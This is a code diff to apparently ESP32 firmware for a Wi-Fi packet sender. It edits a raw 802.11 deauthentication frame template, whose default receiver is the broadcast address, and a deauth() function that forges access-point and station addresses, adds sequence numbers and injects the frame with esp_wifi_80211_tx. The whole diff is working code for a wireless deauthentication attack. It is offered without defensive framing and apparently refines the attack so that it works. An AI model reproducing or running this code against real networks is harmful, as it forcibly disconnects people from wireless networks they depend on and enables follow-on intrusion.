@@ -41,7 +41,7 @@ const uint8_t probePacket[] = {
 
 const uint8_t deauthPacket[] = {
     /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
-    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
+    /*  2 - 3  */ 0x3A, 0x01,                         // duration
     /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
     /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
     /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
@@ -101,17 +101,25 @@ const uint8_t beaconPacket[109] = {
 };
 
 esp_err_t PacketSender::deauth(const MacAddr ap, const MacAddr station,
-        uint8_t reason, uint8_t channel) {
+        const MacAddr bssid, uint8_t reason, uint8_t channel) {
     
     esp_err_t res = change_channel(channel);
     if(res != ESP_OK) return res;
     
     memcpy(buffer, deauthPacket, sizeof(deauthPacket));
-    memcpy(&buffer[4], station, 6);
-    memcpy(&buffer[10], ap, 6);
-    memcpy(&buffer[16], ap, 6);
+    printf("DEAUTH -> %02X:%02X:%02X:%02X:%02X:%02X\n",
+            ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);
+    printf("       -> %02X:%02X:%02X:%02X:%02X:%02X\n",
+            station[0], station[1], station[2], station[3],
+            station[4], station[5]);
+
+    memcpy(&buffer[4], ap, 6);
+    memcpy(&buffer[10], station, 6);
+    memcpy(&buffer[16], bssid, 6);
+    memcpy(&buffer[22], &seqnum, 2);
     buffer[24] = reason;
-    //changeChannel(channel);
+
+    seqnum++;
 
     res = esp_wifi_80211_tx(WIFI_IF_AP, buffer, sizeof(deauthPacket), false);
     if(res == ESP_OK) return ESP_OK;
